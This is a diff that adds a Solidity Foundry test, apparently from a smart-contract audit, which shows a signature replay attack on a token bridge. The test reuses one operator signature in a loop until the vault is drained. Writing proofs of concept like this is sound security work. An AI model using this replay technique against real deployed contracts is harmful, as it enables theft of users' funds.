@@ -264,4 +264,26 @@ contract L1BossBridgeTest is Test {
                 MessageHashUtils.toEthSignedMessageHash(keccak256(message))
             );
     }
+    function testSignatureReplayAttacks() public {
+        uint256 amount = 1 ether;
+
+        uint256 vaultInitialBalance = 100e18;
+        uint256 userInitialBalance = token.balanceOf(user);
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user, amount),
+            operator.key
+        );
+
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(user, amount, v, r, s);
+        }
+
+        uint256 userEndingBalance = token.balanceOf(user);
+        uint256 vaultEndingBalance = token.balanceOf(address(vault));
+
+        assertEq(userEndingBalance, vaultInitialBalance + userInitialBalance);
+        assertEq(vaultEndingBalance, 0);
+    }
 }
